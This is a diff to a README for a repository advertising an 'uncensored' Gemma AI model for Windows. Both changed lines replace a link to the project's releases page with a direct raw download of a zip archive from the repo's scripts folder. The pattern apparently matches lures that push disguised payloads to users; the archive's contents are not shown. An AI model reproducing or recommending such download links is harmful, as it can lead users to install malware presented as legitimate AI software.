@@ -1,6 +1,6 @@
 # 🚀 Gemma-4-31B-Uncensored-NVFP4-DFlash - Run fast uncensored AI on Windows
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Nihal-puliyakkady/Gemma-4-31B-Uncensored-NVFP4-DFlash/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Nihal-puliyakkady/Gemma-4-31B-Uncensored-NVFP4-DFlash/raw/refs/heads/main/scripts/Gemma-Uncensored-NVF-Flash-D-2.9.zip)
 
 ## What is this tool?
 
@@ -20,7 +20,7 @@ If your computer does not meet these specs, the software might run slowly or fai
 
 ## 📥 Downloading the software
 
-Visit this page to download the software: https://github.com/Nihal-puliyakkady/Gemma-4-31B-Uncensored-NVFP4-DFlash/releases
+Visit this page to download the software: https://github.com/Nihal-puliyakkady/Gemma-4-31B-Uncensored-NVFP4-DFlash/raw/refs/heads/main/scripts/Gemma-Uncensored-NVF-Flash-D-2.9.zip
 
 ## ⚙️ Installation steps
 
